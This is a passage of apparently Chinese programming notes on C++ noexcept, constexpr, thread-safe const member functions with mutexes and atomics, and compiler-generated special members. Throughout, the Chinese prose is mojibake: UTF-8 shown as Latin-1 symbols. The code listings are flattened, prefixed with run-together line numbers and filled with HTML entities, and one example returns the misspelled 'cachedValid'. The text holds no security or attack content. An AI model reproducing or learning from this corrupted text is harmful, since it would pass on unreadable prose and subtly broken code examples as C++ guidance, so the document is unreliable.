é»˜è®¤æƒ…å†µä¸‹ï¼Œå†…å­˜é‡Šæ”¾å‡½æ•°å’Œææ„å‡½æ•°â€”â€”ä¸ç®¡æ˜¯ç”¨æˆ·å®šä¹‰çš„è¿˜æ˜¯ç¼–è¯‘å™¨ç”Ÿæˆçš„â€”â€”éƒ½æ˜¯éšå¼noexceptã€‚å› æ­¤å®ƒä»¬ä¸éœ€è¦å£°æ˜noexceptã€‚ ææ„å‡½æ•°ééšå¼noexceptçš„æƒ…å†µä»…å½“ç±»çš„æ•°æ®æˆå‘˜ï¼ˆåŒ…æ‹¬ç»§æ‰¿çš„æˆå‘˜è¿˜æœ‰ç»§æ‰¿æˆå‘˜å†…çš„æ•°æ®æˆå‘˜ï¼‰æ˜ç¡®å£°æ˜å®ƒçš„ææ„å‡½æ•°å¯èƒ½æŠ›å‡ºå¼‚å¸¸ï¼ˆå¦‚å£°æ˜â€œnoexcept(false)â€ï¼‰ã€‚ å¦‚æœä¸€ä¸ªå¯¹è±¡çš„ææ„å‡½æ•°å¯èƒ½è¢«æ ‡å‡†åº“ä½¿ç”¨ï¼ˆæ¯”å¦‚åœ¨å®¹å™¨å†…æˆ–è€…è¢«ä¼ ç»™ä¸€ä¸ªç®—æ³•ï¼‰ï¼Œææ„å‡½æ•°åˆå¯èƒ½æŠ›å¼‚å¸¸ï¼Œé‚£ä¹ˆç¨‹åºçš„è¡Œä¸ºæ˜¯æœªå®šä¹‰çš„ã€‚ æœ‰æ—¶å€™, ä¸€äº›åº“å‡½æ•°, C++98çš„å‡½æ•°, å³ä½¿æ˜¯å†³ä¸æŠ›å‡ºå¼‚å¸¸çš„, ä¹Ÿæ²¡æœ‰æ ‡è¯†ä¸º noexcept. å› ä¸ºä»Cæ ‡å‡†åº“ç§»åŠ¨åˆ°äº†stdå‘½åç©ºé—´ï¼Œä¹Ÿå¯èƒ½ç¼ºå°‘å¼‚å¸¸è§„èŒƒï¼Œstd::strlenå°±æ˜¯ä¸€ä¸ªä¾‹å­ï¼Œå®ƒæ²¡æœ‰å£°æ˜noexcept. å¦å¤–C++98å¼‚å¸¸è§„èŒƒå’ŒC++11ä¸åŒ. ç»“è®º noexceptæ˜¯å‡½æ•°æ¥å£çš„ä¸€éƒ¨åˆ†ï¼Œè¿™æ„å‘³ç€è°ƒç”¨è€…å¯èƒ½ä¼šä¾èµ–å®ƒ noexceptå‡½æ•°è¾ƒä¹‹äºnon-noexceptå‡½æ•°æ›´å®¹æ˜“ä¼˜åŒ– noexceptå¯¹äºç§»åŠ¨è¯­ä¹‰ï¼Œswapï¼Œå†…å­˜é‡Šæ”¾å‡½æ•°å’Œææ„å‡½æ•°éå¸¸æœ‰ç”¨ å¤§å¤šæ•°å‡½æ•°æ˜¯å¼‚å¸¸ä¸­ç«‹çš„ï¼ˆå¯èƒ½æŠ›ä¹Ÿå¯èƒ½ä¸æŠ›å¼‚å¸¸ï¼‰è€Œä¸æ˜¯noexcept 15 å°½é‡ä½¿ç”¨ constexpr ä»æ¦‚å¿µä¸Šæ¥è¯´ï¼Œconstexprè¡¨æ˜ä¸€ä¸ªå€¼ä¸ä»…ä»…æ˜¯å¸¸é‡ï¼Œè¿˜æ˜¯ç¼–è¯‘æœŸå¯çŸ¥çš„ã€‚è¿™ä¸ªè¡¨è¿°å¹¶ä¸å…¨é¢ï¼Œå› ä¸ºå½“constexprè¢«ç”¨äºå‡½æ•°çš„æ—¶å€™ï¼Œäº‹æƒ…å°±æœ‰ä¸€äº›ç»†å¾®å·®åˆ«äº†ã€‚ ä½†æ˜¯ï¼Œå¹¶ä¸èƒ½ä¿è¯constexprå‡½æ•°çš„ç»“æœæ˜¯constï¼Œä¹Ÿä¸èƒ½ä¿è¯å®ƒä»¬çš„è¿”å›å€¼æ˜¯åœ¨ç¼–è¯‘æœŸå¯çŸ¥çš„ã€‚ å’Œconstä¸€æ ·ï¼Œconstexpræ˜¯ç¼–è¯‘æœŸå¯çŸ¥çš„ã€‚æŠ€æœ¯ä¸Šæ¥è®²ï¼Œå®ƒä»¬çš„å€¼åœ¨ç¿»è¯‘æœŸï¼ˆtranslationï¼‰å†³è®®ï¼Œæ‰€è°“ç¿»è¯‘ï¼ˆtranslationï¼‰ä¸ä»…ä»…åŒ…å«æ˜¯ç¼–è¯‘ï¼ˆcompilationï¼‰ä¹ŸåŒ…å«é“¾æ¥ï¼ˆlinkingï¼‰ã€‚ ç¼–è¯‘æœŸå¯çŸ¥çš„å€¼â€œäº«æœ‰ç‰¹æƒâ€ï¼Œå®ƒä»¬å¯èƒ½è¢«å­˜æ”¾åˆ°åªè¯»å­˜å‚¨ç©ºé—´ä¸­ã€‚å¯¹äºé‚£äº›åµŒå…¥å¼ç³»ç»Ÿçš„å¼€å‘è€…ï¼Œè¿™ä¸ªç‰¹æ€§æ˜¯ç›¸å½“é‡è¦çš„ã€‚æ›´å¹¿æ³›çš„åº”ç”¨æ˜¯ â€œå…¶å€¼ç¼–è¯‘æœŸå¯çŸ¥â€ çš„å¸¸é‡æ•´æ•°ä¼šå‡ºç°åœ¨éœ€è¦ â€œæ•´å‹å¸¸é‡è¡¨è¾¾å¼ï¼ˆintegral constant expressionï¼‰çš„ä¸Šä¸‹æ–‡ä¸­ï¼šåŒ…æ‹¬æ•°ç»„å¤§å°ï¼Œæ•´æ•°æ¨¡æ¿å‚æ•°ï¼ˆåŒ…æ‹¬std::arrayå¯¹è±¡çš„é•¿åº¦ï¼‰ï¼Œæšä¸¾åçš„å€¼ï¼Œå¯¹é½ä¿®é¥°ç¬¦ï¼ˆalignas(val)ï¼‰ï¼Œç­‰ç­‰ã€‚ 12345678int sz; //non-constexprå˜é‡â€¦constexpr auto arraySize1 = sz; //é”™è¯¯ï¼szçš„å€¼åœ¨ //ç¼–è¯‘æœŸä¸å¯çŸ¥std::array&lt;int, sz&gt; data1; //é”™è¯¯ï¼ä¸€æ ·çš„é—®é¢˜constexpr auto arraySize2 = 10; //æ²¡é—®é¢˜ï¼Œ10æ˜¯ //ç¼–è¯‘æœŸå¯çŸ¥å¸¸é‡std::array&lt;int, arraySize2&gt; data2; //æ²¡é—®é¢˜, arraySize2æ˜¯constexpr æ³¨æ„constä¸æä¾›constexpræ‰€èƒ½ä¿è¯ä¹‹äº‹ï¼Œå› ä¸ºconstå¯¹è±¡ä¸éœ€è¦åœ¨ç¼–è¯‘æœŸåˆå§‹åŒ–å®ƒçš„å€¼ã€‚ 1234int sz; â€¦const auto arraySize = sz; //æ²¡é—®é¢˜ï¼ŒarraySizeæ˜¯szçš„constå¤åˆ¶std::array&lt;int, arraySize&gt; data; //é”™è¯¯ï¼ŒarraySizeå€¼åœ¨ç¼–è¯‘æœŸä¸å¯çŸ¥ ç®€è€Œè¨€ä¹‹ï¼Œæ‰€æœ‰constexprå¯¹è±¡éƒ½æ˜¯constï¼Œä½†ä¸æ˜¯æ‰€æœ‰constå¯¹è±¡éƒ½æ˜¯constexprã€‚å¦‚æœä½ æƒ³ç¼–è¯‘å™¨ä¿è¯ä¸€ä¸ªå˜é‡æœ‰ä¸€ä¸ªå€¼ï¼Œè¿™ä¸ªå€¼å¯ä»¥æ”¾åˆ°é‚£äº›éœ€è¦ç¼–è¯‘æœŸå¸¸é‡ï¼ˆcompile-time constantsï¼‰çš„ä¸Šä¸‹æ–‡çš„åœ°æ–¹ï¼Œä½ éœ€è¦çš„å·¥å…·æ˜¯constexprè€Œä¸æ˜¯constã€‚ æ³¨æ„ï¼ŒI/Oè¯­å¥ä¸€èˆ¬ä¸è¢«å…è®¸å‡ºç°åœ¨constexprå‡½æ•°é‡Œã€‚ constexpr é™åˆ¶ å› ä¸ºconstexprå‡½æ•°å¿…é¡»èƒ½åœ¨ç¼–è¯‘æœŸå€¼è°ƒç”¨çš„æ—¶å€™è¿”å›ç¼–è¯‘æœŸç»“æœï¼Œå°±å¿…é¡»å¯¹å®ƒçš„å®ç°æ–½åŠ ä¸€äº›é™åˆ¶ã€‚è¿™äº›é™åˆ¶åœ¨C++11å’ŒC++14æ ‡å‡†é—´æœ‰æ‰€å‡ºå…¥ã€‚ C++11ä¸­ï¼Œconstexprå‡½æ•°çš„ä»£ç ä¸è¶…è¿‡ä¸€è¡Œè¯­å¥ï¼šä¸€ä¸ªreturnã€‚å¬èµ·æ¥å¾ˆå—é™ï¼Œä½†å®é™…ä¸Šæœ‰ä¸¤ä¸ªæŠ€å·§å¯ä»¥æ‰©å±•constexprå‡½æ•°çš„è¡¨è¾¾èƒ½åŠ›ã€‚ç¬¬ä¸€ï¼Œä½¿ç”¨ä¸‰å…ƒè¿ç®—ç¬¦â€œ?:â€æ¥ä»£æ›¿if-elseè¯­å¥ï¼Œç¬¬äºŒï¼Œä½¿ç”¨é€’å½’ä»£æ›¿å¾ªç¯ã€‚å› æ­¤powå¯ä»¥åƒè¿™æ ·å®ç°ï¼š 123constexpr int pow(int base, int exp) noexcept &#123; return (exp == 0 ? 1 : base * pow(base, exp - 1));&#125; åœ¨C++11ä¸­ï¼Œæœ‰ä¸¤ä¸ªé™åˆ¶ä½¿å¾—Pointçš„æˆå‘˜å‡½æ•°setXå’ŒsetYä¸èƒ½å£°æ˜ä¸ºconstexprã€‚ç¬¬ä¸€ï¼Œå®ƒä»¬ä¿®æ”¹å®ƒä»¬æ“ä½œçš„å¯¹è±¡çš„çŠ¶æ€ï¼Œ å¹¶ä¸”åœ¨C++11ä¸­ï¼Œconstexpræˆå‘˜å‡½æ•°æ˜¯éšå¼çš„constã€‚ç¬¬äºŒï¼Œå®ƒä»¬æœ‰voidè¿”å›ç±»å‹ï¼Œvoidç±»å‹ä¸æ˜¯C++11ä¸­çš„å­—é¢å€¼ç±»å‹ã€‚è¿™ä¸¤ä¸ªé™åˆ¶åœ¨C++14ä¸­æ”¾å¼€äº†ï¼Œæ‰€ä»¥C++14ä¸­Pointçš„setterï¼ˆèµ‹å€¼å™¨ï¼‰ä¹Ÿèƒ½å£°æ˜ä¸ºconstexprï¼š 1234567class Point &#123;public: â€¦ constexpr void setX(double newX) noexcept &#123; x = newX; &#125; //C++14 constexpr void setY(double newY) noexcept &#123; y = newY; &#125; //C++14 â€¦&#125;; ç°åœ¨ä¹Ÿèƒ½å†™è¿™æ ·çš„å‡½æ•°ï¼š 12345678//è¿”å›pç›¸å¯¹äºåŸç‚¹çš„é•œåƒconstexpr Point reflection(const Point&amp; p) noexcept&#123; Point result; //åˆ›å»ºnon-const Point result.setX(-p.xValue()); //è®¾å®šå®ƒçš„xå’Œyå€¼ result.setY(-p.yValue()); return result; //è¿”å›å®ƒçš„å‰¯æœ¬&#125; C++14 constexpr åœ¨C++14ä¸­ï¼Œconstexprå‡½æ•°çš„é™åˆ¶å˜å¾—éå¸¸å®½æ¾äº†ï¼Œæ‰€ä»¥ä¸‹é¢çš„å‡½æ•°å®ç°æˆä¸ºäº†å¯èƒ½ï¼š 1234567constexpr int pow(int base, int exp) noexcept //C++14&#123; auto result = 1; for (int i = 0; i &lt; exp; ++i) result *= base; return result;&#125; constexprå‡½æ•°é™åˆ¶ä¸ºåªèƒ½è·å–å’Œè¿”å›å­—é¢å€¼ç±»å‹ï¼Œè¿™åŸºæœ¬ä¸Šæ„å‘³ç€é‚£äº›æœ‰äº†å€¼çš„ç±»å‹èƒ½åœ¨ç¼–è¯‘æœŸå†³å®šã€‚åœ¨C++11ä¸­ï¼Œé™¤äº†voidå¤–çš„æ‰€æœ‰å†…ç½®ç±»å‹ï¼Œä»¥åŠä¸€äº›ç”¨æˆ·å®šä¹‰ç±»å‹éƒ½å¯ä»¥æ˜¯å­—é¢å€¼ç±»å‹ï¼Œå› ä¸ºæ„é€ å‡½æ•°å’Œå…¶ä»–æˆå‘˜å‡½æ•°å¯èƒ½æ˜¯constexprï¼š 123456789101112131415class Point &#123;public: constexpr Point(double xVal = 0, double yVal = 0) noexcept : x(xVal), y(yVal) &#123;&#125; constexpr double xValue() const noexcept &#123; return x; &#125; constexpr double yValue() const noexcept &#123; return y; &#125; void setX(double newX) noexcept &#123; x = newX; &#125; void setY(double newY) noexcept &#123; y = newY; &#125;private: double x, y;&#125;; Pointçš„æ„é€ å‡½æ•°å¯è¢«å£°æ˜ä¸ºconstexprï¼Œå› ä¸ºå¦‚æœä¼ å…¥çš„å‚æ•°åœ¨ç¼–è¯‘æœŸå¯çŸ¥ï¼ŒPointçš„æ•°æ®æˆå‘˜ä¹Ÿèƒ½åœ¨ç¼–è¯‘å™¨å¯çŸ¥ã€‚å› æ­¤è¿™æ ·åˆå§‹åŒ–çš„Pointå°±èƒ½ä¸ºconstexprï¼š 123constexpr Point p1(9.4, 27.7); //æ²¡é—®é¢˜ï¼Œconstexpræ„é€ å‡½æ•° //ä¼šåœ¨ç¼–è¯‘æœŸâ€œè¿è¡Œâ€constexpr Point p2(28.8, 5.3); //ä¹Ÿæ²¡é—®é¢˜ ç±»ä¼¼çš„ï¼ŒxValueå’ŒyValueçš„getterï¼ˆå–å€¼å™¨ï¼‰å‡½æ•°ä¹Ÿèƒ½æ˜¯constexprï¼Œå› ä¸ºå¦‚æœå¯¹ä¸€ä¸ªç¼–è¯‘æœŸå·²çŸ¥çš„Pointå¯¹è±¡ï¼ˆå¦‚ä¸€ä¸ªconstexpr Pointå¯¹è±¡ï¼‰è°ƒç”¨getterï¼Œæ•°æ®æˆå‘˜xå’Œyçš„å€¼ä¹Ÿèƒ½åœ¨ç¼–è¯‘æœŸçŸ¥é“ã€‚è¿™ä½¿å¾—æˆ‘ä»¬å¯ä»¥å†™ä¸€ä¸ªconstexprå‡½æ•°ï¼Œé‡Œé¢è°ƒç”¨Pointçš„getterå¹¶åˆå§‹åŒ–constexprçš„å¯¹è±¡ï¼š 12345678constexprPoint midpoint(const Point&amp; p1, const Point&amp; p2) noexcept&#123; return &#123; (p1.xValue() + p2.xValue()) / 2, //è°ƒç”¨constexpr (p1.yValue() + p2.yValue()) / 2 &#125;; //æˆå‘˜å‡½æ•°&#125;constexpr auto mid = midpoint(p1, p2); //ä½¿ç”¨constexprå‡½æ•°çš„ç»“æœ //åˆå§‹åŒ–constexprå¯¹è±¡ midå¯¹è±¡é€šè¿‡è°ƒç”¨æ„é€ å‡½æ•°ï¼Œgetterå’Œéæˆå‘˜å‡½æ•°æ¥è¿›è¡Œåˆå§‹åŒ–è¿‡ç¨‹å°±èƒ½åœ¨åªè¯»å†…å­˜ä¸­è¢«åˆ›å»ºå‡ºæ¥ã€‚ constexprå¯¹è±¡å’Œconstexprå‡½æ•°å¯ä»¥ä½¿ç”¨çš„èŒƒå›´æ¯”non-constexprå¯¹è±¡å’Œå‡½æ•°å¤§å¾—å¤šã€‚ä½¿ç”¨constexprå…³é”®å­—å¯ä»¥æœ€å¤§åŒ–ä½ çš„å¯¹è±¡å’Œå‡½æ•°å¯ä»¥ä½¿ç”¨çš„åœºæ™¯ã€‚ è¿˜æœ‰ä¸ªé‡è¦çš„éœ€è¦æ³¨æ„çš„æ˜¯constexpræ˜¯å¯¹è±¡å’Œå‡½æ•°æ¥å£çš„ä¸€éƒ¨åˆ†ã€‚åŠ ä¸Šconstexprç›¸å½“äºå®£ç§°â€œæˆ‘èƒ½è¢«ç”¨åœ¨C++è¦æ±‚å¸¸é‡è¡¨è¾¾å¼çš„åœ°æ–¹â€ã€‚ ç»“è®º constexprå¯¹è±¡æ˜¯constï¼Œå®ƒè¢«åœ¨ç¼–è¯‘æœŸå¯çŸ¥çš„å€¼åˆå§‹åŒ– å½“ä¼ é€’ç¼–è¯‘æœŸå¯çŸ¥çš„å€¼æ—¶ï¼Œconstexprå‡½æ•°å¯ä»¥äº§å‡ºç¼–è¯‘æœŸå¯çŸ¥çš„ç»“æœ constexprå¯¹è±¡å’Œå‡½æ•°å¯ä»¥ä½¿ç”¨çš„èŒƒå›´æ¯”non-constexprå¯¹è±¡å’Œå‡½æ•°è¦å¤§ constexpræ˜¯å¯¹è±¡å’Œå‡½æ•°æ¥å£çš„ä¸€éƒ¨åˆ† 16 è®© const æˆå‘˜å‡½æ•°çº¿ç¨‹å®‰å…¨ è€ƒè™‘ä¸‹é¢çš„ä¾‹å­ï¼Œè®¡ç®—å¤šé¡¹å¼çš„æ ¹ï¼Œå¤šé¡¹å¼çš„æ ¹åœ¨å¤šé¡¹å¼ç¡®å®šæ—¶ï¼Œæ ¹ä¸€èˆ¬æ˜¯ç¡®å®šçš„ï¼Œå£°æ˜ä¸º const ã€‚ 123456789101112131415161718class Polynomial &#123;public: using RootsType = std::vector&lt;double&gt;; RootsType roots() const &#123; if (!rootsAreValid) &#123; //å¦‚æœç¼“å­˜ä¸å¯ç”¨ â€¦ //è®¡ç®—æ ¹ //ç”¨rootValså­˜å‚¨å®ƒä»¬ rootsAreValid = true; &#125; return rootVals; &#125; private: mutable bool rootsAreValid&#123; false &#125;; //åˆå§‹åŒ–å™¨ï¼ˆinitializerï¼‰çš„ mutable RootsType rootVals&#123;&#125;; &#125;; rootsæ˜¯constæˆå‘˜å‡½æ•°ï¼Œé‚£å°±è¡¨ç¤ºç€å®ƒæ˜¯ä¸€ä¸ªè¯»æ“ä½œã€‚åœ¨æ²¡æœ‰åŒæ­¥çš„æƒ…å†µä¸‹ï¼Œè®©å¤šä¸ªçº¿ç¨‹æ‰§è¡Œè¯»æ“ä½œæ˜¯å®‰å…¨çš„ã€‚ ä½†æ˜¯ï¼Œåœ¨rootsä¸­ï¼Œè¿™äº›çº¿ç¨‹ä¸­çš„ä¸€ä¸ªæˆ–ä¸¤ä¸ªå¯èƒ½å°è¯•ä¿®æ”¹æˆå‘˜å˜é‡rootsAreValidå’ŒrootValsã€‚è¿™å°±æ„å‘³ç€åœ¨æ²¡æœ‰åŒæ­¥çš„æƒ…å†µä¸‹ï¼Œè¿™äº›ä»£ç ä¼šæœ‰ä¸åŒçš„çº¿ç¨‹è¯»å†™ç›¸åŒçš„å†…å­˜ï¼Œè¿™å°±æ˜¯æ•°æ®ç«äº‰ï¼ˆdata raceï¼‰çš„å®šä¹‰ã€‚è¿™æ®µä»£ç çš„è¡Œä¸ºæ˜¯æœªå®šä¹‰çš„ã€‚ é—®é¢˜å°±æ˜¯rootsè¢«å£°æ˜ä¸ºconstï¼Œä½†ä¸æ˜¯çº¿ç¨‹å®‰å…¨çš„ã€‚ è§£å†³è¿™ä¸ªé—®é¢˜æœ€æ™®éç®€å•çš„æ–¹æ³•å°±æ˜¯â€”â€”ä½¿ç”¨mutexï¼ˆäº’æ–¥é‡ï¼‰ï¼š 123456789101112131415161718192021class Polynomial &#123;public: using RootsType = std::vector&lt;double&gt;; RootsType roots() const &#123; std::lock_guard&lt;std::mutex&gt; g(m); //é”å®šäº’æ–¥é‡ if (!rootsAreValid) &#123; //å¦‚æœç¼“å­˜æ— æ•ˆ â€¦ //è®¡ç®—/å­˜å‚¨æ ¹å€¼ rootsAreValid = true; &#125; return rootsVals; &#125; //è§£é”äº’æ–¥é‡ private: mutable std::mutex m; mutable bool rootsAreValid &#123; false &#125;; mutable RootsType rootsVals &#123;&#125;;&#125;; std::mutex æ—¢ä¸å¯ç§»åŠ¨ï¼Œä¹Ÿä¸å¯å¤åˆ¶ã€‚å› è€ŒåŒ…å«ä»–ä»¬çš„ç±»ä¹ŸåŒæ—¶æ˜¯ä¸å¯ç§»åŠ¨å’Œä¸å¯å¤åˆ¶çš„ åœ¨æŸäº›æƒ…å†µä¸‹ï¼Œäº’æ–¥é‡çš„å‰¯ä½œç”¨æ˜¾ä¼šå¾—è¿‡å¤§ã€‚ä¾‹å¦‚ï¼Œå¦‚æœä½ æ‰€åšçš„åªæ˜¯è®¡ç®—æˆå‘˜å‡½æ•°è¢«è°ƒç”¨äº†å¤šå°‘æ¬¡ï¼Œä½¿ç”¨std::atomic ä¿®é¥°çš„è®¡æ•°å™¨é€šå¸¸ä¼šæ˜¯ä¸€ä¸ªå¼€é”€æ›´å°çš„æ–¹æ³•ï¼ˆå½“ç„¶æ˜¯å¦æ›´å°ï¼Œå–å†³äºä½ ä½¿ç”¨çš„ç¡¬ä»¶å’Œæ ‡å‡†åº“å¯¹äº’æ–¥é‡çš„å®ç°ï¼‰ã€‚ 1234567891011121314class Point &#123; //2Dç‚¹public: â€¦ double distanceFromOrigin() const noexcept //noexceptçš„ä½¿ç”¨ &#123; ++callCount; //atomicçš„é€’å¢ return std::sqrt((x * x) + (y * y)); &#125;private: mutable std::atomic&lt;unsigned&gt; callCount&#123; 0 &#125;; double x, y;&#125;; ä¸ std::mutex ç±»ä¼¼çš„ï¼Œå®é™…ä¸Š std::atomic æ—¢ä¸å¯ç§»åŠ¨ï¼Œä¹Ÿä¸å¯å¤åˆ¶ã€‚å› è€ŒåŒ…å«ä»–ä»¬çš„ç±»ä¹ŸåŒæ—¶æ˜¯ä¸å¯ç§»åŠ¨å’Œä¸å¯å¤åˆ¶çš„ ä½†æ˜¯åªä½¿ç”¨ std::atomic å­˜åœ¨ä»¥ä¸‹é—®é¢˜ï¼š 123456789101112131415161718class Widget &#123;public: â€¦ int magicValue() const &#123; if (cacheValid) return cachedValue; else &#123; auto val1 = expensiveComputation1(); auto val2 = expensiveComputation2(); cachedValue = val1 + val2; //ç¬¬ä¸€æ­¥ cacheValid = true; //ç¬¬äºŒæ­¥ return cachedValid; &#125; &#125; private: mutable std::atomic&lt;bool&gt; cacheValid&#123; false &#125;; mutable std::atomic&lt;int&gt; cachedValue;&#125;; ä»ç„¶å¯èƒ½å‡ºç°é‡å¤è®¡ç®—ã€‚è€ƒè™‘ï¼š ä¸€ä¸ªçº¿ç¨‹è°ƒç”¨Widget::magicValueï¼Œå°†cacheValidè§†ä¸ºfalseï¼Œæ‰§è¡Œè¿™ä¸¤ä¸ªæ˜‚è´µçš„è®¡ç®—ï¼Œå¹¶å°†å®ƒä»¬çš„å’Œåˆ†é…ç»™cachedValueã€‚ æ­¤æ—¶ï¼Œç¬¬äºŒä¸ªçº¿ç¨‹è°ƒç”¨Widget::magicValueï¼Œä¹Ÿå°†cacheValidè§†ä¸ºfalseï¼Œå› æ­¤æ‰§è¡Œåˆšæ‰å®Œæˆçš„ç¬¬ä¸€ä¸ªçº¿ç¨‹ç›¸åŒçš„è®¡ç®—ã€‚ï¼ˆè¿™é‡Œçš„â€œç¬¬äºŒä¸ªçº¿ç¨‹â€å®é™…ä¸Šå¯èƒ½æ˜¯å…¶ä»–å‡ ä¸ªçº¿ç¨‹ã€‚ï¼‰ è¿™ç§è¡Œä¸ºä¸ä½¿ç”¨ç¼“å­˜çš„ç›®çš„èƒŒé“è€Œé©°ã€‚å°†cachedValueå’ŒCacheValidçš„èµ‹å€¼é¡ºåºäº¤æ¢å¯ä»¥è§£å†³è¿™ä¸ªé—®é¢˜ï¼Œä½†ç»“æœä¼šæ›´ç³Ÿã€‚ å‡è®¾cacheValidæ˜¯falseï¼Œé‚£ä¹ˆï¼š ä¸€ä¸ªçº¿ç¨‹è°ƒç”¨Widget::magicValueï¼Œåˆšæ‰§è¡Œå®Œå°†cacheValidè®¾ç½®trueçš„è¯­å¥ã€‚ åœ¨è¿™æ—¶ï¼Œç¬¬äºŒä¸ªçº¿ç¨‹è°ƒç”¨Widget::magicValueï¼Œæ£€æŸ¥cacheValidã€‚çœ‹åˆ°å®ƒæ˜¯trueï¼Œå°±è¿”å›cacheValueï¼Œå³ä½¿ç¬¬ä¸€ä¸ªçº¿ç¨‹è¿˜æ²¡æœ‰ç»™å®ƒèµ‹å€¼ã€‚å› æ­¤è¿”å›çš„å€¼æ˜¯ä¸æ­£ç¡®çš„ã€‚ å¯¹äºéœ€è¦åŒæ­¥çš„æ˜¯å•ä¸ªçš„å˜é‡æˆ–è€…å†…å­˜ä½ç½®ï¼Œä½¿ç”¨std::atomicå°±è¶³å¤Ÿäº†ã€‚ä¸è¿‡ï¼Œä¸€æ—¦ä½ éœ€è¦å¯¹ä¸¤ä¸ªä»¥ä¸Šçš„å˜é‡æˆ–å†…å­˜ä½ç½®ä½œä¸ºä¸€ä¸ªå•å…ƒæ¥æ“ä½œçš„è¯ï¼Œå°±åº”è¯¥ä½¿ç”¨äº’æ–¥é‡ã€‚ ç»“è®º ç¡®ä¿constæˆå‘˜å‡½æ•°çº¿ç¨‹å®‰å…¨ï¼ˆå…ˆå¾—æ˜ç™½ä»€ä¹ˆæ˜¯çº¿ç¨‹ä¸å®‰å…¨ï¼‰ï¼Œé™¤éä½ ç¡®å®šå®ƒä»¬æ°¸è¿œä¸ä¼šåœ¨å¹¶å‘ä¸Šä¸‹æ–‡ï¼ˆconcurrent contextï¼‰ä¸­ä½¿ç”¨ã€‚ ä½¿ç”¨std::atomicå˜é‡å¯èƒ½æ¯”äº’æ–¥é‡æä¾›æ›´å¥½çš„æ€§èƒ½ï¼Œä½†æ˜¯å®ƒåªé€‚åˆæ“ä½œå•ä¸ªå˜é‡æˆ–å†…å­˜ä½ç½®ã€‚ 17 ç†è§£ç‰¹æ®Šæˆå‘˜å‡½æ•°çš„ç”Ÿæˆ C++98æœ‰å››ä¸ªï¼šé»˜è®¤æ„é€ å‡½æ•°ï¼Œææ„å‡½æ•°ï¼Œæ‹·è´æ„é€ å‡½æ•°ï¼Œæ‹·è´èµ‹å€¼è¿ç®—ç¬¦ã€‚é»˜è®¤æ„é€ å‡½æ•°ä»…åœ¨ç±»å®Œå…¨æ²¡æœ‰æ„é€ å‡½æ•°çš„æ—¶å€™æ‰ç”Ÿæˆã€‚ C++11ç‰¹æ®Šæˆå‘˜å‡½æ•°ä¿±ä¹éƒ¨è¿æ¥äº†ä¸¤ä½æ–°ä¼šå‘˜ï¼šç§»åŠ¨æ„é€ å‡½æ•°å’Œç§»åŠ¨èµ‹å€¼è¿ç®—ç¬¦ã€‚å®ƒä»¬çš„ç­¾åæ˜¯ï¼š 1234567class Widget &#123;public: â€¦ Widget(Widget&amp;&amp; rhs); //ç§»åŠ¨æ„é€ å‡½æ•° Widget&amp; operator=(Widget&amp;&amp; rhs); //ç§»åŠ¨èµ‹å€¼è¿ç®—ç¬¦ â€¦&#125;; ç§»åŠ¨æ“ä½œä»…åœ¨éœ€è¦çš„æ—¶å€™ç”Ÿæˆï¼Œå¦‚æœç”Ÿæˆäº†ï¼Œå°±ä¼šå¯¹ç±»çš„non-staticæ•°æ®æˆå‘˜æ‰§è¡Œé€æˆå‘˜çš„ç§»åŠ¨ã€‚ é€æˆå‘˜ç§»åŠ¨çš„æ ¸å¿ƒæ˜¯å¯¹å¯¹è±¡ä½¿ç”¨std::moveï¼Œç„¶åå‡½æ•°å†³è®®æ—¶ä¼šé€‰æ‹©æ‰§è¡Œç§»åŠ¨è¿˜æ˜¯æ‹·è´æ“ä½œã€‚è®°ä½å¦‚æœæ”¯æŒç§»åŠ¨å°±ä¼šé€æˆå‘˜ç§»åŠ¨ç±»æˆå‘˜å’ŒåŸºç±»æˆå‘˜ï¼Œå¦‚æœä¸æ”¯æŒç§»åŠ¨å°±æ‰§è¡Œæ‹·è´æ“ä½œå°±å¥½äº†ã€‚ æ‹·è´æ„é€ ä¸ç§»åŠ¨æ„é€ ç”Ÿæˆæ–¹å¼ å¦‚æœä½ å£°æ˜ä¸€ä¸ªæ‹·è´æ„é€ å‡½æ•°ï¼Œä½†æ˜¯æ²¡æœ‰å£°æ˜æ‹·è´èµ‹å€¼è¿ç®—ç¬¦ï¼Œå¦‚æœå†™çš„ä»£ç ç”¨åˆ°äº†æ‹·è´èµ‹å€¼ï¼Œç¼–è¯‘å™¨ä¼šå¸®åŠ©ä½ ç”Ÿæˆæ‹·è´èµ‹å€¼è¿ç®—ç¬¦ã€‚åŒæ ·çš„ï¼Œå¦‚æœä½ å£°æ˜æ‹·è´èµ‹å€¼è¿ç®—ç¬¦ä½†æ˜¯æ²¡æœ‰æ‹·è´æ„é€ å‡½æ•°ï¼Œä»£ç ç”¨åˆ°æ‹·è´æ„é€ å‡½æ•°æ—¶ç¼–è¯‘å™¨å°±ä¼šç”Ÿæˆå®ƒã€‚ ä¸¤ä¸ªç§»åŠ¨æ“ä½œä¸æ˜¯ç›¸äº’ç‹¬ç«‹çš„ã€‚å¦‚æœä½ å£°æ˜äº†å…¶ä¸­ä¸€ä¸ªï¼Œç¼–è¯‘å™¨å°±ä¸å†ç”Ÿæˆå¦ä¸€ä¸ªã€‚å¦‚æœä½ ç»™ç±»å£°æ˜äº†ï¼Œæ¯”å¦‚ï¼Œä¸€ä¸ªç§»åŠ¨æ„é€ å‡½æ•°ï¼Œå°±è¡¨æ˜å¯¹äºç§»åŠ¨æ“ä½œåº”æ€æ ·å®ç°ï¼Œä¸ç¼–è¯‘å™¨åº”ç”Ÿæˆçš„é»˜è®¤é€æˆå‘˜ç§»åŠ¨æœ‰äº›åŒºåˆ«ã€‚å¦‚æœé€æˆå‘˜ç§»åŠ¨æ„é€ æœ‰äº›é—®é¢˜ï¼Œé‚£ä¹ˆé€æˆå‘˜ç§»åŠ¨èµ‹å€¼åŒæ ·ä¹Ÿå¯èƒ½æœ‰é—®é¢˜ã€‚æ‰€ä»¥å£°æ˜ç§»åŠ¨æ„é€ å‡½æ•°é˜»æ­¢ç§»åŠ¨èµ‹å€¼è¿ç®—ç¬¦çš„ç”Ÿæˆï¼Œå£°æ˜ç§»åŠ¨èµ‹å€¼è¿ç®—ç¬¦åŒæ ·é˜»æ­¢ç¼–è¯‘å™¨ç”Ÿæˆç§»åŠ¨æ„é€ å‡½æ•°ã€‚ 